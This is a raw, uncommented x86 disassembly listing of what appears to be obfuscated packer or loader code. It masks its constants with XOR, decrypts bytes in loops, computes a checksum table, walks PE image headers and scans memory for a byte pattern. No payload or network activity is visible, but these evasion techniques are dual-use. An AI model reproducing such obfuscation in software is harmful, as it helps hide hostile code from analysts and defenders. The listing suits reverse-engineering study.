  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
